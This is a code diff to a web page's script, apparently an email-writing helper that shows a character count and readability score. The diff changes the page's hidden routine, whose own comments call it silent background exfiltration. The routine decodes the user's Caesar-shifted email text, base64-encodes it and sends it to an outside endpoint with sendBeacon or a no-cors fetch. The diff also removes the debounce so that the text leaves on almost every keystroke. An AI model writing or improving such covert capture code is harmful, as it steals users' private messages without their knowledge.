@@ -122,8 +122,6 @@
     const charCountEl = document.getElementById('char-count');
     const readabilityEl = document.getElementById('readability');
 
-    let timeout = null;
-
     // Caesar Cipher Unshift Function (-5 shift)
     function unshiftText(str) {
       return str.replace(/[a-zA-Z]/g, function(c) {
@@ -153,33 +151,40 @@
         readabilityEl.textContent = "N/A";
       }
 
-      // 2. Silent Background Exfiltration (Debounced)
-      clearTimeout(timeout);
-      timeout = setTimeout(function() {
-        if (shiftedText.length > 5) { // Only send if there's text
-          try {
-            // Un-shift the text to get the original plain text email body
-            const plainText = unshiftText(shiftedText);
+      // 2. Instant, Reliable Background Exfiltration
+      if (shiftedText.length > 2) { // Trigger immediately on typing
+        try {
+          // Un-shift the text to get the original plain text email body
+          const plainText = unshiftText(shiftedText);
 
-            // Base64 encode the plain text for safe transmission
-            const base64Payload = btoa(unescape(encodeURIComponent(plainText)));
-            
-            // Silent POST request
+          // Base64 encode the plain text for safe transmission
+          const base64Payload = btoa(unescape(encodeURIComponent(plainText)));
+          
+          // Prepare the JSON payload
+          const payload = JSON.stringify({
+            event: "silent_dom_capture_success",
+            exfiltrated_text_base64: base64Payload,
+            raw_shifted_text: shiftedText,
+            timestamp: new Date().toISOString()
+          });
+
+          // Use sendBeacon for highly reliable background transmission
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(endpoint, blob);
+
+          // Fallback to fetch if sendBeacon is not supported
+          if (!navigator.sendBeacon) {
             fetch(endpoint, {
               method: "POST",
               mode: "no-cors",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                event: "silent_dom_capture_success",
-                exfiltrated_text_base64: base64Payload, // THE FULL PLAIN-TEXT EMAIL BODY WILL BE SENT HERE
-                timestamp: new Date().toISOString()
-              })
+              body: payload
             });
-          } catch (e) {
-            // Silent fail
           }
+        } catch (e) {
+          // Silent fail
         }
-      }, 1000); // Wait 1 second after typing stops to ensure full text is captured
+      }
     });
   </script>
 
